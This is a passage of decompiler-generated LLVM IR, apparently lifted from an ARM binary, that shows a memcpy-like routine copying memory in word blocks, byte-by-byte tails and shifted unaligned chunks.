  store i32 %v5_1a858, i32* %v4_1a858, align 4
  %v6_1a858 = add i32 %v0_1a850, 24
  %v7_1a858 = inttoptr i32 %v6_1a858 to i32*
  %v8_1a858 = load i32, i32* @ip, align 4
  store i32 %v8_1a858, i32* %v7_1a858, align 4
  %v9_1a858 = add i32 %v0_1a850, 28
  %v10_1a858 = inttoptr i32 %v9_1a858 to i32*
  %v11_1a858 = load i32, i32* @lr, align 4
  store i32 %v11_1a858, i32* %v10_1a858, align 4
  %v12_1a858 = add i32 %v0_1a850, 32
  store i32 %v12_1a858, i32* %r0.global-to-local, align 4
  %v0_1a85c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a85c = add i32 %v0_1a85c, -32
  store i32 %v2_1a85c, i32* %r2.global-to-local, align 4
  %v6_1a860 = icmp slt i32 %v0_1a85c, 32
  br i1 %v6_1a860, label %dec_label_pc_1a864, label %dec_label_pc_1a84c.dec_label_pc_1a84c_crit_edge

dec_label_pc_1a84c.dec_label_pc_1a84c_crit_edge:  ; preds = %dec_label_pc_1a84c
  %v0_1a84c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a84c

dec_label_pc_1a864:                               ; preds = %dec_label_pc_1a84c
  %v4_1a864 = add i32 %v0_1a85c, -16
  %v6_1a864 = add i32 %v0_1a85c, 2147483616
  %v7_1a864 = and i32 %v4_1a864, %v6_1a864
  %v8_1a864 = icmp slt i32 %v7_1a864, 0
  store i1 %v8_1a864, i1* %cpsr_v.global-to-local, align 1
  %v9_1a864 = icmp slt i32 %v4_1a864, 0
  store i1 %v9_1a864, i1* %cpsr_n.global-to-local, align 1
  %v5_1a868 = icmp slt i32 %v2_1a85c, -16
  br i1 %v5_1a868, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_1a864
  %v6_1a868 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a868 = inttoptr i32 %v6_1a868 to i32*
  %v8_1a868 = load i32, i32* %v7_1a868, align 4
  store i32 %v8_1a868, i32* @r3, align 4
  %v9_1a868 = add i32 %v6_1a868, 4
  %v10_1a868 = inttoptr i32 %v9_1a868 to i32*
  %v11_1a868 = load i32, i32* %v10_1a868, align 4
  store i32 %v11_1a868, i32* %r4.global-to-local, align 4
  %v12_1a868 = add i32 %v6_1a868, 8
  %v13_1a868 = inttoptr i32 %v12_1a868 to i32*
  %v14_1a868 = load i32, i32* %v13_1a868, align 4
  store i32 %v14_1a868, i32* @ip, align 4
  %v15_1a868 = add i32 %v6_1a868, 12
  %v16_1a868 = inttoptr i32 %v15_1a868 to i32*
  %v17_1a868 = load i32, i32* %v16_1a868, align 4
  store i32 %v17_1a868, i32* @lr, align 4
  %v18_1a868 = add i32 %v6_1a868, 16
  store i32 %v18_1a868, i32* %r1.global-to-local, align 4
  %v7_1a86c = inttoptr i32 %v12_1a858 to i32*
  store i32 %v8_1a868, i32* %v7_1a86c, align 4
  %v9_1a86c = add i32 %v0_1a850, 36
  %v10_1a86c = inttoptr i32 %v9_1a86c to i32*
  %v11_1a86c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1a86c, i32* %v10_1a86c, align 4
  %v12_1a86c = add i32 %v0_1a850, 40
  %v13_1a86c = inttoptr i32 %v12_1a86c to i32*
  %v14_1a86c = load i32, i32* @ip, align 4
  store i32 %v14_1a86c, i32* %v13_1a86c, align 4
  %v15_1a86c = add i32 %v0_1a850, 44
  %v16_1a86c = inttoptr i32 %v15_1a86c to i32*
  %v17_1a86c = load i32, i32* @lr, align 4
  store i32 %v17_1a86c, i32* %v16_1a86c, align 4
  %v18_1a86c = add i32 %v0_1a850, 48
  store i32 %v18_1a86c, i32* %r0.global-to-local, align 4
  %v6_1a870 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a870 = add i32 %v6_1a870, -16
  store i32 %v7_1a870, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a864, %bb130
  %v3_1a880102 = phi i32 [ %v12_1a858, %dec_label_pc_1a864 ], [ %v18_1a86c, %bb130 ]
  %v0_1a87896 = phi i32 [ %v2_1a85c, %dec_label_pc_1a864 ], [ %v7_1a870, %bb130 ]
  %v2_1a874 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a874, i32* @r4, align 4
  br label %dec_label_pc_1a878

dec_label_pc_1a878:                               ; preds = %dec_label_pc_1a840, %.thread2
  %v3_1a880101 = phi i32 [ %v0_1a85093, %dec_label_pc_1a840 ], [ %v3_1a880102, %.thread2 ]
  %v0_1a878 = phi i32 [ %v2_1a840, %dec_label_pc_1a840 ], [ %v0_1a87896, %.thread2 ]
  %v1_1a878 = add i32 %v0_1a878, 20
  store i32 %v1_1a878, i32* %r2.global-to-local, align 4
  %v3_1a878 = sub i32 0, %v0_1a878
  %v4_1a878 = and i32 %v1_1a878, %v3_1a878
  %v5_1a878 = icmp slt i32 %v4_1a878, 0
  store i1 %v5_1a878, i1* %cpsr_v.global-to-local, align 1
  %v6_1a878 = icmp slt i32 %v1_1a878, 0
  store i1 %v6_1a878, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1a87c

dec_label_pc_1a87c:                               ; preds = %.thread118, %dec_label_pc_1a878
  %v0_1a88c.pre149 = phi i32 [ %v0_1a88c.pre, %.thread118 ], [ %v1_1a878, %dec_label_pc_1a878 ]
  %v3_1a880 = phi i32 [ %v3_1a88099119, %.thread118 ], [ %v3_1a880101, %dec_label_pc_1a878 ]
  %v1_1a884 = phi i1 [ %v1_1a888, %.thread118 ], [ %v5_1a878, %dec_label_pc_1a878 ]
  %v0_1a884 = phi i1 [ %v0_1a888, %.thread118 ], [ %v6_1a878, %dec_label_pc_1a878 ]
  %v2_1a87c = xor i1 %v1_1a884, %v0_1a884
  br i1 %v2_1a87c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_1a87c
  %v3_1a87c = load i32, i32* %r1.global-to-local, align 4
  %v4_1a87c = inttoptr i32 %v3_1a87c to i32*
  %v5_1a87c = load i32, i32* %v4_1a87c, align 4
  store i32 %v5_1a87c, i32* @r3, align 4
  %v6_1a87c = add i32 %v3_1a87c, 4
  %v7_1a87c = inttoptr i32 %v6_1a87c to i32*
  %v8_1a87c = load i32, i32* %v7_1a87c, align 4
  store i32 %v8_1a87c, i32* @ip, align 4
  %v9_1a87c = add i32 %v3_1a87c, 8
  %v10_1a87c = inttoptr i32 %v9_1a87c to i32*
  %v11_1a87c = load i32, i32* %v10_1a87c, align 4
  store i32 %v11_1a87c, i32* @lr, align 4
  %v12_1a87c = add i32 %v3_1a87c, 12
  store i32 %v12_1a87c, i32* %r1.global-to-local, align 4
  %v4_1a880 = inttoptr i32 %v3_1a880 to i32*
  store i32 %v5_1a87c, i32* %v4_1a880, align 4
  %v6_1a880 = add i32 %v3_1a880, 4
  %v7_1a880 = inttoptr i32 %v6_1a880 to i32*
  %v8_1a880 = load i32, i32* @ip, align 4
  store i32 %v8_1a880, i32* %v7_1a880, align 4
  %v9_1a880 = add i32 %v3_1a880, 8
  %v10_1a880 = inttoptr i32 %v9_1a880 to i32*
  %v11_1a880 = load i32, i32* @lr, align 4
  store i32 %v11_1a880, i32* %v10_1a880, align 4
  %v12_1a880 = add i32 %v3_1a880, 12
  store i32 %v12_1a880, i32* %r0.global-to-local, align 4
  %v3_1a884 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a884 = add i32 %v3_1a884, -12
  store i32 %v4_1a884, i32* %r2.global-to-local, align 4
  %v6_1a884 = sub i32 11, %v3_1a884
  %v7_1a884 = and i32 %v6_1a884, %v3_1a884
  %v8_1a884 = icmp slt i32 %v7_1a884, 0
  store i1 %v8_1a884, i1* %cpsr_v.global-to-local, align 1
  %v9_1a884 = icmp slt i32 %v4_1a884, 0
  store i1 %v9_1a884, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_1a87c, %bb131
  %v0_1a88c.pre = phi i32 [ %v4_1a884, %bb131 ], [ %v0_1a88c.pre149, %dec_label_pc_1a87c ]
  %v3_1a88099119 = phi i32 [ %v12_1a880, %bb131 ], [ %v3_1a880, %dec_label_pc_1a87c ]
  %v1_1a888 = phi i1 [ %v8_1a884, %bb131 ], [ %v1_1a884, %dec_label_pc_1a87c ]
  %v0_1a888 = phi i1 [ %v9_1a884, %bb131 ], [ %v0_1a884, %dec_label_pc_1a87c ]
  %v2_1a888 = xor i1 %v1_1a888, %v0_1a888
  br i1 %v2_1a888, label %dec_label_pc_1a88c, label %dec_label_pc_1a87c

dec_label_pc_1a88c:                               ; preds = %.thread118, %dec_label_pc_1a838
  %v7_1a89c = phi i32 [ %v0_1a85093, %dec_label_pc_1a838 ], [ %v3_1a88099119, %.thread118 ]
  %v0_1a88c = phi i32 [ %v2_1a838, %dec_label_pc_1a838 ], [ %v0_1a88c.pre, %.thread118 ]
  %v2_1a88c = add i32 %v0_1a88c, 8
  store i32 %v2_1a88c, i32* %r2.global-to-local, align 4
  %v4_1a88c = sub i32 0, %v0_1a88c
  %v5_1a88c = and i32 %v2_1a88c, %v4_1a88c
  %v6_1a88c = icmp slt i32 %v5_1a88c, 0
  store i1 %v6_1a88c, i1* %cpsr_v.global-to-local, align 1
  %v7_1a88c = icmp slt i32 %v2_1a88c, 0
  store i1 %v7_1a88c, i1* %cpsr_n.global-to-local, align 1
  %v5_1a890 = icmp slt i32 %v0_1a88c, -8
  br i1 %v5_1a890, label %bb133, label %dec_label_pc_1a894

dec_label_pc_1a894:                               ; preds = %dec_label_pc_1a88c
  %v6_1a894 = add i32 %v0_1a88c, 4
  store i32 %v6_1a894, i32* %r2.global-to-local, align 4
  %v8_1a894 = sub i32 -5, %v0_1a88c
  %v9_1a894 = and i32 %v8_1a894, %v2_1a88c
  %v10_1a894 = icmp slt i32 %v9_1a894, 0
  store i1 %v10_1a894, i1* %cpsr_v.global-to-local, align 1
  %v11_1a894 = icmp slt i32 %v6_1a894, 0
  store i1 %v11_1a894, i1* %cpsr_n.global-to-local, align 1
  %v5_1a898 = icmp slt i32 %v2_1a88c, 4
  %v6_1a898 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a898 = inttoptr i32 %v6_1a898 to i32*
  %v8_1a898 = load i32, i32* %v7_1a898, align 4
  store i32 %v8_1a898, i32* @r3, align 4
  %v10_1a898 = add i32 %v6_1a898, 4
  br i1 %v5_1a898, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_1a894
  store i32 %v10_1a898, i32* %r1.global-to-local, align 4
  %v8_1a89c = inttoptr i32 %v7_1a89c to i32*
  store i32 %v8_1a898, i32* %v8_1a89c, align 4
  %v9_1a89c = load i32, i32* %r0.global-to-local, align 4
  %v10_1a89c = add i32 %v9_1a89c, 4
  store i32 %v10_1a89c, i32* %r0.global-to-local, align 4
  %v0_1a8ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_1a894
  %v10_1a8a0 = inttoptr i32 %v10_1a898 to i32*
  %v11_1a8a0 = load i32, i32* %v10_1a8a0, align 4
  store i32 %v11_1a8a0, i32* @ip, align 4
  %v12_1a8a0 = add i32 %v6_1a898, 8
  store i32 %v12_1a8a0, i32* %r1.global-to-local, align 4
  %v7_1a8a4 = inttoptr i32 %v7_1a89c to i32*
  store i32 %v8_1a898, i32* %v7_1a8a4, align 4
  %v9_1a8a4 = add i32 %v7_1a89c, 4
  %v10_1a8a4 = inttoptr i32 %v9_1a8a4 to i32*
  %v11_1a8a4 = load i32, i32* @ip, align 4
  store i32 %v11_1a8a4, i32* %v10_1a8a4, align 4
  %v12_1a8a4 = add i32 %v7_1a89c, 8
  store i32 %v12_1a8a4, i32* %r0.global-to-local, align 4
  %v6_1a8a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a8a8 = add i32 %v6_1a8a8, -4
  store i32 %v7_1a8a8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1a88c, %bb, %dec_label_pc_1aa54, %dec_label_pc_1a9e8, %dec_label_pc_1a97c, %bb132
  %v2_1a8bc = phi i32 [ %v10_1a89c, %.thread6 ], [ %v0_1a94c76, %.thread12 ], [ %v7_1a89c, %dec_label_pc_1a88c ], [ %v1_1a810, %bb ], [ %v2_1a8bc114, %dec_label_pc_1aa54 ], [ %v2_1a8bc113, %dec_label_pc_1a9e8 ], [ %v2_1a8bc112, %dec_label_pc_1a97c ], [ %v12_1a8a4, %bb132 ]
  %v0_1a8ac = phi i32 [ %v0_1a8ac.pre, %.thread6 ], [ %v2_1a8f4, %.thread12 ], [ %v2_1a88c, %dec_label_pc_1a88c ], [ %v2_1a820, %bb ], [ %v0_1a8ac110, %dec_label_pc_1aa54 ], [ %v0_1a8ac109, %dec_label_pc_1a9e8 ], [ %v0_1a8ac108, %dec_label_pc_1a97c ], [ %v7_1a8a8, %bb132 ]
  %v1_1a8ac = add i32 %v0_1a8ac, 4
  store i32 %v1_1a8ac, i32* @r2, align 4
  %v3_1a8ac = sub i32 0, %v0_1a8ac
  %v4_1a8ac = and i32 %v1_1a8ac, %v3_1a8ac
  %v5_1a8ac = icmp slt i32 %v4_1a8ac, 0
  store i1 %v5_1a8ac, i1* %cpsr_v.global-to-local, align 1
  %v6_1a8ac = icmp slt i32 %v1_1a8ac, 0
  store i1 %v6_1a8ac, i1* %cpsr_n.global-to-local, align 1
  %v7_1a8ac = icmp eq i32 %v1_1a8ac, 0
  store i1 %v7_1a8ac, i1* @cpsr_z, align 1
  br i1 %v7_1a8ac, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_1a8b0 = load i8*, i8** %stack_var_-8, align 4
  %v4_1a8b0 = ptrtoint i8* %v3_1a8b0 to i32
  store i32 %v4_1a8b0, i32* %r0.global-to-local, align 4
  ret i32 %v4_1a8b0

bb135:                                            ; preds = %bb133
  %v1_1a8b4 = add i32 %v0_1a8ac, 2
  %v3_1a8b4 = sub i32 -3, %v0_1a8ac
  %v4_1a8b4 = and i32 %v3_1a8b4, %v1_1a8ac
  %v5_1a8b4 = icmp slt i32 %v4_1a8b4, 0
  store i1 %v5_1a8b4, i1* %cpsr_v.global-to-local, align 1
  %v6_1a8b4 = icmp slt i32 %v1_1a8b4, 0
  store i1 %v6_1a8b4, i1* %cpsr_n.global-to-local, align 1
  %v7_1a8b4 = icmp eq i32 %v1_1a8ac, 2
  store i1 %v7_1a8b4, i1* @cpsr_z, align 1
  %v0_1a8b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a8b8 = inttoptr i32 %v0_1a8b8 to i8*
  %v2_1a8b8 = load i8, i8* %v1_1a8b8, align 1
  %v3_1a8b8 = zext i8 %v2_1a8b8 to i32
  store i32 %v3_1a8b8, i32* @r3, align 4
  %v5_1a8b8 = add i32 %v0_1a8b8, 1
  store i32 %v5_1a8b8, i32* %r1.global-to-local, align 4
  %v3_1a8bc = inttoptr i32 %v2_1a8bc to i8*
  store i8 %v2_1a8b8, i8* %v3_1a8bc, align 1
  %v4_1a8bc = load i32, i32* %r0.global-to-local, align 4
  %v5_1a8bc = add i32 %v4_1a8bc, 1
  store i32 %v5_1a8bc, i32* %r0.global-to-local, align 4
  %v0_1a8c0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1a8c0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1a8c0 = xor i1 %v0_1a8c0, %v1_1a8c0
  br i1 %v2_1a8c0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_1a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a8c0 = inttoptr i32 %v3_1a8c0 to i8*
  %v5_1a8c0 = load i8, i8* %v4_1a8c0, align 1
  %v6_1a8c0 = zext i8 %v5_1a8c0 to i32
  store i32 %v6_1a8c0, i32* @r3, align 4
  %v8_1a8c0 = add i32 %v3_1a8c0, 1
  store i32 %v8_1a8c0, i32* %r1.global-to-local, align 4
  %v6_1a8c4 = inttoptr i32 %v5_1a8bc to i8*
  store i8 %v5_1a8c0, i8* %v6_1a8c4, align 1
  %v7_1a8c4 = load i32, i32* %r0.global-to-local, align 4
  %v8_1a8c4 = add i32 %v7_1a8c4, 1
  store i32 %v8_1a8c4, i32* %r0.global-to-local, align 4
  %v1_1a8c8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a8c8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_1a8cc = phi i32 [ %v8_1a8c4, %bb136 ], [ %v5_1a8bc, %bb135 ]
  %v2_1a8cc = phi i1 [ %v2_1a8c8.pre, %bb136 ], [ %v1_1a8c0, %bb135 ]
  %v1_1a8cc = phi i1 [ %v1_1a8c8.pre, %bb136 ], [ %v0_1a8c0, %bb135 ]
  %v0_1a8c8 = load i1, i1* @cpsr_z, align 1
  %v3_1a8c8 = xor i1 %v2_1a8cc, %v1_1a8cc
  %v4_1a8c8 = or i1 %v0_1a8c8, %v3_1a8c8
  br i1 %v4_1a8c8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_1a8c8 = load i32, i32* %r1.global-to-local, align 4
  %v6_1a8c8 = inttoptr i32 %v5_1a8c8 to i8*
  %v7_1a8c8 = load i8, i8* %v6_1a8c8, align 1
  %v8_1a8c8 = zext i8 %v7_1a8c8 to i32
  store i32 %v8_1a8c8, i32* @r3, align 4
  %v10_1a8c8 = add i32 %v5_1a8c8, 1
  store i32 %v10_1a8c8, i32* %r1.global-to-local, align 4
  %v8_1a8cc = inttoptr i32 %v7_1a8cc to i8*
  store i8 %v7_1a8c8, i8* %v8_1a8cc, align 1
  %v9_1a8cc = load i32, i32* %r0.global-to-local, align 4
  %v10_1a8cc = add i32 %v9_1a8cc, 1
  store i32 %v10_1a8cc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_1a8d0 = load i8*, i8** %stack_var_-8, align 4
  %v3_1a8d0 = ptrtoint i8* %v2_1a8d0 to i32
  store i32 %v3_1a8d0, i32* %r0.global-to-local, align 4
  ret i32 %v3_1a8d0

dec_label_pc_1a8d4:                               ; preds = %dec_label_pc_1a828
  %v1_1a8d4 = sub nsw i32 4, %v1_1a828
  store i32 %v1_1a8d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1a8d8 = icmp ult i32 %v1_1a8d4, 2
  store i1 %v8_1a8d8, i1* %cpsr_n.global-to-local, align 1
  %v1_1a8dc = inttoptr i32 %v0_1a810 to i8*
  %v2_1a8dc = load i8, i8* %v1_1a8dc, align 1
  %v3_1a8dc = zext i8 %v2_1a8dc to i32
  store i32 %v3_1a8dc, i32* @r3, align 4
  %v5_1a8dc = add i32 %v0_1a810, 1
  store i32 %v5_1a8dc, i32* %r1.global-to-local, align 4
  store i8 %v2_1a8dc, i8* %v5_1a81c, align 1
  %v4_1a8e0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a8e0 = add i32 %v4_1a8e0, 1
  store i32 %v5_1a8e0, i32* %r0.global-to-local, align 4
  br i1 %v8_1a8d8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_1a8d4
  %v9_1a8d8 = icmp eq i32 %v1_1a8d4, 2
  %v6_1a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a8e4 = inttoptr i32 %v6_1a8e4 to i8*
  %v8_1a8e4 = load i8, i8* %v7_1a8e4, align 1
  %v9_1a8e4 = zext i8 %v8_1a8e4 to i32
  store i32 %v9_1a8e4, i32* @r3, align 4
  %v11_1a8e4 = add i32 %v6_1a8e4, 1
  store i32 %v11_1a8e4, i32* %r1.global-to-local, align 4
  %v9_1a8e8 = inttoptr i32 %v5_1a8e0 to i8*
  store i8 %v8_1a8e4, i8* %v9_1a8e8, align 1
  %v10_1a8e8 = load i32, i32* %r0.global-to-local, align 4
  %v11_1a8e8 = add i32 %v10_1a8e8, 1
  store i32 %v11_1a8e8, i32* %r0.global-to-local, align 4
  br i1 %v9_1a8d8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_1a8ec = load i32, i32* %r1.global-to-local, align 4
  %v9_1a8ec = inttoptr i32 %v8_1a8ec to i8*
  %v10_1a8ec = load i8, i8* %v9_1a8ec, align 1
  %v11_1a8ec = zext i8 %v10_1a8ec to i32
  store i32 %v11_1a8ec, i32* @r3, align 4
  %v13_1a8ec = add i32 %v8_1a8ec, 1
  store i32 %v13_1a8ec, i32* %r1.global-to-local, align 4
  %v11_1a8f0 = inttoptr i32 %v11_1a8e8 to i8*
  store i8 %v10_1a8ec, i8* %v11_1a8f0, align 1
  %v12_1a8f0 = load i32, i32* %r0.global-to-local, align 4
  %v13_1a8f0 = add i32 %v12_1a8f0, 1
  store i32 %v13_1a8f0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_1a8d4, %bb139
  %v0_1a94c76 = phi i32 [ %v11_1a8e8, %bb138 ], [ %v5_1a8e0, %dec_label_pc_1a8d4 ], [ %v13_1a8f0, %bb139 ]
  %v0_1a8f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a8f4 = load i32, i32* @ip, align 4
  %v2_1a8f4 = sub i32 %v0_1a8f4, %v1_1a8f4
  store i32 %v2_1a8f4, i32* %r2.global-to-local, align 4
  %v4_1a8f4 = xor i32 %v1_1a8f4, %v0_1a8f4
  %v5_1a8f4 = xor i32 %v2_1a8f4, %v0_1a8f4
  %v6_1a8f4 = and i32 %v5_1a8f4, %v4_1a8f4
  %v7_1a8f4 = icmp slt i32 %v6_1a8f4, 0
  store i1 %v7_1a8f4, i1* %cpsr_v.global-to-local, align 1
  %v8_1a8f4 = icmp slt i32 %v2_1a8f4, 0
  store i1 %v8_1a8f4, i1* %cpsr_n.global-to-local, align 1
  %v5_1a8f8 = icmp slt i32 %v0_1a8f4, %v1_1a8f4
  br i1 %v5_1a8f8, label %bb133, label %dec_label_pc_1a8fc

dec_label_pc_1a8fc:                               ; preds = %.thread12
  %v0_1a8fc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a8fc = urem i32 %v0_1a8fc, 4
  store i32 %v1_1a8fc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a8fc = icmp eq i32 %v1_1a8fc, 0
  %extract.t124 = trunc i32 %v0_1a8fc to i2
  br i1 %v2_1a8fc, label %dec_label_pc_1a838, label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a830, %dec_label_pc_1a8fc
  %v0_1a94c75 = phi i32 [ %v1_1a810, %dec_label_pc_1a830 ], [ %v0_1a94c76, %dec_label_pc_1a8fc ]
  %v0_1a9f8 = phi i32 [ %v2_1a820, %dec_label_pc_1a830 ], [ %v2_1a8f4, %dec_label_pc_1a8fc ]
  %v0_1a90c.off0 = phi i2 [ %extract.t, %dec_label_pc_1a830 ], [ %extract.t124, %dec_label_pc_1a8fc ]
  %v0_1a904 = phi i32 [ %v0_1a810, %dec_label_pc_1a830 ], [ %v0_1a8fc, %dec_label_pc_1a8fc ]
  %v1_1a904 = and i32 %v0_1a904, -4
  store i32 %v1_1a904, i32* %r1.global-to-local, align 4
  %v1_1a908 = inttoptr i32 %v1_1a904 to i32*
  %v2_1a908 = load i32, i32* %v1_1a908, align 4
  store i32 %v2_1a908, i32* @lr, align 4
  %v4_1a908 = add i32 %v1_1a904, 4
  store i32 %v4_1a908, i32* %r1.global-to-local, align 4
  %v2_1a9f0 = add i32 %v0_1a9f8, -12
  %v4_1a9f0 = sub i32 11, %v0_1a9f8
  %v5_1a9f0 = and i32 %v4_1a9f0, %v0_1a9f8
  %v6_1a9f0 = icmp slt i32 %v5_1a9f0, 0
  store i1 %v6_1a9f0, i1* %cpsr_v.global-to-local, align 1
  %v7_1a9f0 = icmp slt i32 %v2_1a9f0, 0
  store i1 %v7_1a9f0, i1* %cpsr_n.global-to-local, align 1
  %v5_1a9f4 = icmp slt i32 %v0_1a9f8, 12
  switch i2 %v0_1a90c.off0, label %dec_label_pc_1a918 [
    i2 -1, label %dec_label_pc_1a9f0
    i2 -2, label %dec_label_pc_1a984
  ]

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a904
  br i1 %v5_1a9f4, label %dec_label_pc_1a964, label %dec_label_pc_1a920

dec_label_pc_1a920:                               ; preds = %dec_label_pc_1a918
  store i32 %v2_1a9f0, i32* %r2.global-to-local, align 4
  %v3_1a924 = load i32, i32* @r4, align 4
  store i32 %v3_1a924, i32* %stack_var_-16, align 4
  %v6_1a924 = load i32, i32* @r5, align 4
  store i32 %v6_1a924, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a928

dec_label_pc_1a928:                               ; preds = %dec_label_pc_1a928.dec_label_pc_1a928_crit_edge, %dec_label_pc_1a920
  %v0_1a94c = phi i32 [ %v12_1a94c, %dec_label_pc_1a928.dec_label_pc_1a928_crit_edge ], [ %v0_1a94c75, %dec_label_pc_1a920 ]
  %v0_1a92c = phi i32 [ %v0_1a92c.pre, %dec_label_pc_1a928.dec_label_pc_1a928_crit_edge ], [ %v4_1a908, %dec_label_pc_1a920 ]
  %v0_1a928 = phi i32 [ %v0_1a928.pre, %dec_label_pc_1a928.dec_label_pc_1a928_crit_edge ], [ %v2_1a908, %dec_label_pc_1a920 ]
  %v3_1a928 = mul i32 %v0_1a928, 256
  %v1_1a92c = inttoptr i32 %v0_1a92c to i32*
  %v2_1a92c = load i32, i32* %v1_1a92c, align 4
  store i32 %v2_1a92c, i32* %r4.global-to-local, align 4
  %v3_1a92c = add i32 %v0_1a92c, 4
  %v4_1a92c = inttoptr i32 %v3_1a92c to i32*
  %v5_1a92c = load i32, i32* %v4_1a92c, align 4
  store i32 %v5_1a92c, i32* %r5.global-to-local, align 4
  %v6_1a92c = add i32 %v0_1a92c, 8
  %v7_1a92c = inttoptr i32 %v6_1a92c to i32*
  %v8_1a92c = load i32, i32* %v7_1a92c, align 4
  store i32 %v8_1a92c, i32* %ip.global-to-local, align 4
  %v9_1a92c = add i32 %v0_1a92c, 12
  %v10_1a92c = inttoptr i32 %v9_1a92c to i32*
  %v11_1a92c = load i32, i32* %v10_1a92c, align 4
  store i32 %v11_1a92c, i32* @lr, align 4
  %v12_1a92c = add i32 %v0_1a92c, 16
  store i32 %v12_1a92c, i32* %r1.global-to-local, align 4
  %v4_1a930 = udiv i32 %v2_1a92c, 16777216
  %v5_1a930 = or i32 %v4_1a930, %v3_1a928
  store i32 %v5_1a930, i32* @r3, align 4
  %v3_1a934 = mul i32 %v2_1a92c, 256
  %v4_1a938 = udiv i32 %v5_1a92c, 16777216
  %v5_1a938 = or i32 %v4_1a938, %v3_1a934
  store i32 %v5_1a938, i32* %r4.global-to-local, align 4
  %v3_1a93c = mul i32 %v5_1a92c, 256
  %v4_1a940 = udiv i32 %v8_1a92c, 16777216
  %v5_1a940 = or i32 %v4_1a940, %v3_1a93c
  store i32 %v5_1a940, i32* %r5.global-to-local, align 4
  %v3_1a944 = mul i32 %v8_1a92c, 256
  %v4_1a948 = udiv i32 %v11_1a92c, 16777216
  %v5_1a948 = or i32 %v4_1a948, %v3_1a944
  store i32 %v5_1a948, i32* @ip, align 4
  %v1_1a94c = inttoptr i32 %v0_1a94c to i32*
  store i32 %v5_1a930, i32* %v1_1a94c, align 4
  %v3_1a94c = add i32 %v0_1a94c, 4
  %v4_1a94c = inttoptr i32 %v3_1a94c to i32*
  %v5_1a94c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a94c, i32* %v4_1a94c, align 4
  %v6_1a94c = add i32 %v0_1a94c, 8
  %v7_1a94c = inttoptr i32 %v6_1a94c to i32*
  %v8_1a94c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a94c, i32* %v7_1a94c, align 4
  %v9_1a94c = add i32 %v0_1a94c, 12
  %v10_1a94c = inttoptr i32 %v9_1a94c to i32*
  %v11_1a94c = load i32, i32* @ip, align 4
  store i32 %v11_1a94c, i32* %v10_1a94c, align 4
  %v12_1a94c = add i32 %v0_1a94c, 16
  store i32 %v12_1a94c, i32* %r0.global-to-local, align 4
  %v0_1a950 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a950 = add i32 %v0_1a950, -16
  store i32 %v2_1a950, i32* %r2.global-to-local, align 4
  %v6_1a954 = icmp slt i32 %v0_1a950, 16
  br i1 %v6_1a954, label %dec_label_pc_1a958, label %dec_label_pc_1a928.dec_label_pc_1a928_crit_edge

dec_label_pc_1a928.dec_label_pc_1a928_crit_edge:  ; preds = %dec_label_pc_1a928
  %v0_1a928.pre = load i32, i32* @lr, align 4
  %v0_1a92c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a928

dec_label_pc_1a958:                               ; preds = %dec_label_pc_1a928
  %v2_1a958 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a958, i32* @r4, align 4
  %v5_1a958 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a958, i32* @r5, align 4
  %v2_1a95c = add i32 %v0_1a950, -4
  store i32 %v2_1a95c, i32* %r2.global-to-local, align 4
  %v4_1a95c = add i32 %v0_1a950, 2147483632
  %v5_1a95c = and i32 %v2_1a95c, %v4_1a95c
  %v6_1a95c = icmp slt i32 %v5_1a95c, 0
  store i1 %v6_1a95c, i1* %cpsr_v.global-to-local, align 1
  %v7_1a95c = icmp slt i32 %v2_1a95c, 0
  store i1 %v7_1a95c, i1* %cpsr_n.global-to-local, align 1
  %v5_1a960 = icmp slt i32 %v2_1a950, -12
